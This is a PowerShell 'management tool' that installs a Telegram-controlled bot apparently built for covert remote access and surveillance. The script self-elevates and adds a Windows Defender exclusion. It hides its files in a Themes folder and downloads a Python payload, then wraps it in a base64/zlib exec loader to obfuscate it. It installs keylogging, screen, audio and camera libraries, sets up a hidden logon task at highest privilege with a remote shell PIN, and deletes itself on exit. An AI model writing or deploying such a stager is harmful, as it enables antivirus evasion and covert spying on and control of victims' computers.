#Requires -Version 5.1
<#
.SYNOPSIS
    Watchguard Bot v3.0 - Management Tool
.DESCRIPTION
    TUI menu for installation, removal, and process management.
#>

# ── Admin elevation (self-elevates via UAC) ──────────────────────────────────
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
           ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host ""
    Write-Host "  [!] Administrator rights required - UAC prompt will appear..." -ForegroundColor Yellow
    Write-Host ""
    Start-Process powershell -Verb RunAs -ArgumentList `
        "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    exit
}

# ══════════════════════════════════════════════════════════════════════════════
# HELPER FUNCTIONS
# ══════════════════════════════════════════════════════════════════════════════

function Write-Banner {
    Clear-Host
    Write-Host ""
    Write-Host "  ============================================================" -ForegroundColor Cyan
    Write-Host "       Watchguard Bot v3.0  --  Management Tool             " -ForegroundColor Cyan
    Write-Host "  ============================================================" -ForegroundColor Cyan
    Write-Host ""
}

function Write-Header {
    param([string]$Text)
    Write-Host ""
    Write-Host ("  " + "=" * 56) -ForegroundColor Cyan
    Write-Host "  $Text" -ForegroundColor Cyan
    Write-Host ("  " + "=" * 56) -ForegroundColor Cyan
    Write-Host ""
}

function Write-Step  { param([string]$T); Write-Host "  [*] $T" -ForegroundColor Yellow }
function Write-OK    { param([string]$T); Write-Host "  [+] $T" -ForegroundColor Green  }
function Write-Err   { param([string]$T); Write-Host "  [!] $T" -ForegroundColor Red    }
function Write-Info  { param([string]$T); Write-Host "      $T" -ForegroundColor Gray   }

# ── Shared variables ──────────────────────────────────────────────────────────
$watchguardDir = Join-Path $env:APPDATA "Microsoft\Windows\Themes\Watchguard"
$datPath       = Join-Path $watchguardDir "watchguard.dat"
$scriptDest    = Join-Path $watchguardDir "watchguard_v3.pyw"
$scriptUrl     = "https://raw.githubusercontent.com/zygomatic-git/watchguard/main/watchguard_v3.pyw"
$taskName      = "WatchguardBot"

# ══════════════════════════════════════════════════════════════════════════════
# FIND PYTHON
# ══════════════════════════════════════════════════════════════════════════════

function Find-Python {
    try {
        $out = & py --version 2>&1
        if ($LASTEXITCODE -eq 0) {
            $exePath = (Get-Command py -ErrorAction SilentlyContinue).Source
            if ($exePath) {
                $wExe = Join-Path (Split-Path $exePath) "pythonw.exe"
                if (-not (Test-Path $wExe)) {
                    $pwCmd = Get-Command pythonw.exe -ErrorAction SilentlyContinue
                    if ($pwCmd) { $wExe = $pwCmd.Source } else { $wExe = $null }
                }
                return @{ python = $exePath; pythonw = $wExe; version = $out.ToString() }
            }
        }
    } catch {}

    $pw = Get-Command pythonw.exe -ErrorAction SilentlyContinue
    $p  = Get-Command python.exe  -ErrorAction SilentlyContinue
    if ($pw -and $p) {
        $ver = & python.exe --version 2>&1
        return @{ python = $p.Source; pythonw = $pw.Source; version = $ver.ToString() }
    }

    $candidates = @(
        "$env:LOCALAPPDATA\Programs\Python\Python314",
        "$env:LOCALAPPDATA\Programs\Python\Python313",
        "$env:LOCALAPPDATA\Programs\Python\Python312",
        "$env:LOCALAPPDATA\Programs\Python\Python311",
        "$env:LOCALAPPDATA\Programs\Python\Python310",
        "C:\Python312", "C:\Python311", "C:\Python310",
        "$env:ProgramFiles\Python312", "$env:ProgramFiles\Python311"
    )
    foreach ($dir in $candidates) {
        $pExe  = Join-Path $dir "python.exe"
        $pwExe = Join-Path $dir "pythonw.exe"
        if ((Test-Path $pExe) -and (Test-Path $pwExe)) {
            $ver = & $pExe --version 2>&1
            return @{ python = $pExe; pythonw = $pwExe; version = $ver.ToString() }
        }
    }
    return $null
}

# ══════════════════════════════════════════════════════════════════════════════
# ACTION 1: INSTALL / REINSTALL
# ══════════════════════════════════════════════════════════════════════════════

function Invoke-Install {
    Write-Banner
    Write-Header "INSTALL / REINSTALL"

    # Warn if existing installation detected
    if (Test-Path $datPath) {
        Write-Host "  [!] Existing installation detected." -ForegroundColor Yellow
        $confirm = Read-Host "  Overwrite? (Y/N)"
        if ($confirm -notmatch '^[Yy]') {
            Write-Info "Cancelled."
            return
        }
        Invoke-KillProcesses -Silent
    }

    # ── STEP 1: Bot credentials ───────────────────────────────────────────────
    Write-Header "STEP 1/7 - Bot Credentials"

    $token = ""
    while ($token -eq "") {
        $token = (Read-Host "  Bot Token (from BotFather)").Trim()
        if ($token -eq "") { Write-Err "Bot Token cannot be empty." }
    }
    Write-OK "Bot Token received"

    $ownerId = ""
    while ($ownerId -eq "") {
        $raw = (Read-Host "  Owner ID (your Telegram user ID)").Trim()
        if ($raw -match '^\d+$') { $ownerId = $raw } else {
            Write-Err "Owner ID must be digits only. Example: 210965041"
        }
    }
    Write-OK "Owner ID received: $ownerId"

    $pinRaw = (Read-Host "  Shell PIN (optional - digits only, leave blank = no PIN)").Trim()
    if ($pinRaw -match '^\d+$') {
        $pin = $pinRaw
        Write-OK "Shell PIN received"
    } else {
        $pin = "null"
        Write-Info "Shell PIN skipped"
    }

    # ── STEP 2: Defender exclusion ────────────────────────────────────────────
    Write-Header "STEP 2/7 - Antivirus Exclusion"

    Write-Step "Adding Windows Defender exclusion..."
    Write-Info "Path: $watchguardDir"
    try {
        Add-MpPreference -ExclusionPath $watchguardDir -ErrorAction Stop
        Write-OK "Defender exclusion added"
    } catch {
        Write-Err "Could not add Defender exclusion (third-party AV may be active)"
        Write-Info "Please add the following folder as an exclusion in your antivirus:"
        Write-Info "  $watchguardDir"
        Write-Host ""
        Read-Host "  Press Enter after adding the exclusion"
    }

    # ── STEP 3: Python ────────────────────────────────────────────────────────
    Write-Header "STEP 3/7 - Python"

    Write-Step "Searching for Python..."
    $pyInfo = Find-Python

    if ($pyInfo) {
        $pythonExe  = $pyInfo.python
        $pythonwExe = $pyInfo.pythonw
        Write-OK "Python found: $($pyInfo.version)"
        Write-Info "python.exe  : $pythonExe"
        Write-Info "pythonw.exe : $pythonwExe"
    } else {
        Write-Step "Python not found - attempting installation..."
        $wingetOk = $false
        try {
            $wg = Get-Command winget -ErrorAction SilentlyContinue
            if ($wg) {
                Write-Info "Installing Python 3.12 via winget..."
                & winget install Python.Python.3.12 --silent --accept-package-agreements --accept-source-agreements
                if ($LASTEXITCODE -eq 0) { $wingetOk = $true; Write-OK "winget installation complete" }
            }
        } catch {}

        if (-not $wingetOk) {
            Write-Info "winget failed - downloading from python.org..."
            $installerUrl  = "https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe"
            $installerPath = Join-Path $env:TEMP "python_installer.exe"
            try {
                Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath -UseBasicParsing
                Start-Process -FilePath $installerPath `
                    -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_launcher=1" -Wait
                Write-OK "Python installation complete"
            } catch {
                Write-Err "Failed to download/install Python: $_"
                Write-Info "Please install Python 3.10+ from https://python.org"
                Read-Host "  Press Enter to exit"
                return
            }
        }

        $pyInfo = Find-Python
        if ($pyInfo) {
            $pythonExe  = $pyInfo.python
            $pythonwExe = $pyInfo.pythonw
            Write-OK "Python ready: $($pyInfo.version)"
        } else {
            Write-Err "Python still not found. Update PATH and try again."
            Read-Host "  Press Enter to exit"
            return
        }
    }

    if (-not $pythonwExe -or -not (Test-Path $pythonwExe)) {
        Write-Info "pythonw.exe not found - using python.exe"
        $pythonwExe = $pythonExe
    }

    # ── STEP 4: watchguard.dat ────────────────────────────────────────────────
    Write-Header "STEP 4/7 - Configuration File"

    Write-Step "Creating watchguard.dat..."
    New-Item -ItemType Directory -Force -Path $watchguardDir | Out-Null

    $pyDat = @"
import zlib, base64, json, os, sys
token     = sys.argv[1]
owner_id  = int(sys.argv[2])
pin_arg   = sys.argv[3]
shell_pin = int(pin_arg) if pin_arg != 'null' else None
data      = {'bot_token': token, 'owner_id': owner_id, 'shell_pin': shell_pin}
dat_path  = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Themes', 'Watchguard', 'watchguard.dat')
os.makedirs(os.path.dirname(dat_path), exist_ok=True)
encoded   = base64.b64encode(zlib.compress(json.dumps(data).encode('utf-8'))).decode('utf-8')
open(dat_path, 'w', encoding='utf-8').write(encoded)
print('OK:' + dat_path)
"@
    $tmpDat = [System.IO.Path]::GetTempFileName() + '.py'
    $pyDat | Out-File -FilePath $tmpDat -Encoding UTF8 -NoNewline
    try {
        $result = & $pythonExe $tmpDat $token $ownerId $pin 2>&1
        if ($result -like "OK:*") { Write-OK "watchguard.dat created" } else {
            Write-Err "Failed to create watchguard.dat: $result"
            return
        }
    } catch { Write-Err "Error: $_"; return }
    finally  { Remove-Item $tmpDat -Force -ErrorAction SilentlyContinue }

    # ── STEP 5: Download + obfuscate script ───────────────────────────────────
    Write-Header "STEP 5/7 - Bot Script"

    $tempScript  = [System.IO.Path]::GetTempFileName() + '.pyw'
    $localScript = Join-Path $PSScriptRoot "watchguard_v3.pyw"

    if (Test-Path $localScript) {
        Write-Step "Using local watchguard_v3.pyw..."
        Copy-Item $localScript $tempScript -Force
        Write-OK "Source ready (local)"
    } else {
        Write-Step "Downloading watchguard_v3.pyw from GitHub..."
        try {
            Invoke-WebRequest -Uri $scriptUrl -OutFile $tempScript -UseBasicParsing
            Write-OK "Script downloaded"
        } catch {
            Write-Err "Download error: $_"
            Read-Host "  Press Enter to exit"
            return
        }
    }

    Write-Step "Applying obfuscation..."
    $pyObf = @"
import zlib, base64, sys
src = sys.argv[1]; dst = sys.argv[2]
source  = open(src, 'r', encoding='utf-8').read()
encoded = base64.b64encode(zlib.compress(source.encode('utf-8'))).decode('ascii')
loader  = "import zlib,base64;exec(zlib.decompress(base64.b64decode(b'" + encoded + "')).decode())"
open(dst, 'w', encoding='utf-8').write(loader)
print('OK')
"@
    $tmpObf = [System.IO.Path]::GetTempFileName() + '.py'
    $pyObf | Out-File -FilePath $tmpObf -Encoding UTF8 -NoNewline
    try {
        $r = & $pythonExe $tmpObf $tempScript $scriptDest 2>&1
        if ($r -like "OK*") { Write-OK "Script obfuscated: $scriptDest" } else {
            Write-Err "Obfuscation error: $r"
            return
        }
    } catch { Write-Err "Error: $_"; return }
    finally  { Remove-Item $tmpObf, $tempScript -Force -ErrorAction SilentlyContinue }

    # ── STEP 6: Python packages ───────────────────────────────────────────────
    Write-Header "STEP 6/7 - Python Packages"

    Write-Step "Upgrading pip..."
    & $pythonExe -m pip install --upgrade pip --quiet 2>&1 | Out-Null

    $packages = @(
        "pyTelegramBotAPI","pyautogui","pillow","psutil",
        "opencv-python","numpy","pynput","screeninfo",
        "mss","sounddevice","soundfile","dxcam"
    )
    Write-Step "Installing dependencies ($($packages.Count) packages)..."
    & $pythonExe -m pip install @packages --quiet 2>&1 | Out-Null
    if ($LASTEXITCODE -eq 0) { Write-OK "All packages installed" } else {
        Write-Err "Some packages failed - bot may still work"
    }

    # ── STEP 7: Task Scheduler ────────────────────────────────────────────────
    Write-Header "STEP 7/7 - Task Scheduler"

    Write-Step "Creating scheduled task..."
    cmd /c "schtasks /Delete /F /TN $taskName" 2>$null | Out-Null
    $r = cmd /c "schtasks /Create /F /RL HIGHEST /SC ONLOGON /TN $taskName /TR `"`"$pythonwExe`" `"$scriptDest`"`" /RU $env:USERNAME" 2>&1
    if ($LASTEXITCODE -eq 0) { Write-OK "Scheduled task created: $taskName" } else {
        Write-Err "Failed to create scheduled task"
        Write-Info "To add manually: Program=$pythonwExe  Argument=`"$scriptDest`""
    }

    # ── Start bot now? ────────────────────────────────────────────────────────
    Write-Host ""
    $startNow = Read-Host "  Start the bot now? (Y/N)"
    if ($startNow -match '^[Yy]') {
        Start-Process -FilePath $pythonwExe -ArgumentList "`"$scriptDest`"" -WindowStyle Hidden
        Write-OK "Bot started - waiting for Telegram notification..."
    } else {
        Write-Info "Bot will start automatically on next login."
    }

    # ── Summary ───────────────────────────────────────────────────────────────
    Write-Header "INSTALLATION COMPLETE"
    Write-Host "  Bot script   : $scriptDest"   -ForegroundColor Gray
    Write-Host "  Config       : $datPath"       -ForegroundColor Gray
    Write-Host "  Task         : $taskName"      -ForegroundColor Gray
    Write-Host ""
    Write-Host "  Watchguard Bot is ready!" -ForegroundColor Green
    Write-Host ""
}

# ══════════════════════════════════════════════════════════════════════════════
# ACTION 2: UNINSTALL
# ══════════════════════════════════════════════════════════════════════════════

function Invoke-Uninstall {
    Write-Banner
    Write-Header "UNINSTALL"

    Write-Host "  [!] The following will be removed:" -ForegroundColor Yellow
    Write-Host "      - All pythonw.exe processes" -ForegroundColor Gray
    Write-Host "      - Scheduled task: $taskName" -ForegroundColor Gray
    Write-Host "      - $watchguardDir" -ForegroundColor Gray
    Write-Host "      - Windows Defender exclusion" -ForegroundColor Gray
    Write-Host ""
    $confirm = Read-Host "  Are you sure? (Y/N)"
    if ($confirm -notmatch '^[Yy]') {
        Write-Info "Cancelled."
        return
    }

    Write-Step "Stopping processes..."
    $killed = Invoke-KillProcesses -Silent
    if ($killed) { Write-OK "Processes stopped" } else {
        Write-Info "No running processes found"
    }

    Write-Step "Removing scheduled task..."
    cmd /c "schtasks /Delete /F /TN $taskName" 2>$null | Out-Null
    if ($LASTEXITCODE -eq 0) { Write-OK "Task removed" } else {
        Write-Info "Task did not exist"
    }

    Write-Step "Removing files..."
    if (Test-Path $watchguardDir) {
        Remove-Item $watchguardDir -Recurse -Force -ErrorAction SilentlyContinue
        Write-OK "Folder removed: $watchguardDir"
    } else {
        Write-Info "Folder did not exist"
    }

    Write-Step "Removing Defender exclusion..."
    try {
        Remove-MpPreference -ExclusionPath $watchguardDir -ErrorAction Stop
        Write-OK "Defender exclusion removed"
    } catch {
        Write-Info "Could not remove Defender exclusion (or it did not exist)"
    }

    Write-Host ""
    Write-OK "Watchguard Bot completely removed."
    Write-Host ""
}

# ══════════════════════════════════════════════════════════════════════════════
# ACTION 3: STOP PROCESSES
# ══════════════════════════════════════════════════════════════════════════════

function Invoke-KillProcesses {
    param([switch]$Silent)

    $procs = Get-Process -Name "pythonw" -ErrorAction SilentlyContinue
    if (-not $procs) {
        if (-not $Silent) {
            Write-Host ""
            Write-Info "No running pythonw.exe process found."
            Write-Host ""
        }
        return $false
    }

    if (-not $Silent) {
        Write-Host ""
        Write-Host "  Found processes:" -ForegroundColor Yellow
        $procs | ForEach-Object { Write-Host "    PID $($_.Id)  Memory: $([math]::Round($_.WorkingSet64/1MB,1)) MB" -ForegroundColor Gray }
        Write-Host ""
    }

    $procs | Stop-Process -Force -ErrorAction SilentlyContinue

    if (-not $Silent) {
        Write-OK "$($procs.Count) process(es) stopped."
        Write-Host ""
    }
    return $true
}

# ══════════════════════════════════════════════════════════════════════════════
# MAIN MENU
# ══════════════════════════════════════════════════════════════════════════════

while ($true) {
    Write-Banner

    # Show installation status
    if (Test-Path $datPath) {
        Write-Host "  Status : " -NoNewline -ForegroundColor Gray
        Write-Host "Installed " -NoNewline -ForegroundColor Green
        $running = (Get-Process -Name "pythonw" -ErrorAction SilentlyContinue).Count
        if ($running -gt 0) { Write-Host "| Running ($running process)" -ForegroundColor Green } else {
            Write-Host "| Stopped" -ForegroundColor Yellow
        }
    } else {
        Write-Host "  Status : " -NoNewline -ForegroundColor Gray
        Write-Host "Not installed" -ForegroundColor Red
    }

    Write-Host ""
    Write-Host "  --------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  [1]  Install / Reinstall" -ForegroundColor White
    Write-Host "  [2]  Uninstall" -ForegroundColor White
    Write-Host "  [3]  Stop Running Processes" -ForegroundColor White
    Write-Host "  [4]  Exit" -ForegroundColor White
    Write-Host "  --------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host ""

    $choice = Read-Host "  Choice"

    switch ($choice.Trim()) {
        "1" { Invoke-Install;         Read-Host "  Press Enter to return to menu" }
        "2" { Invoke-Uninstall;       Read-Host "  Press Enter to return to menu" }
        "3" { Invoke-KillProcesses;   Read-Host "  Press Enter to return to menu" }
        "4" {
            # Self-delete and exit
            Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
            exit
        }
        default { Write-Host "  Invalid choice." -ForegroundColor Red; Start-Sleep 1 }
    }
}
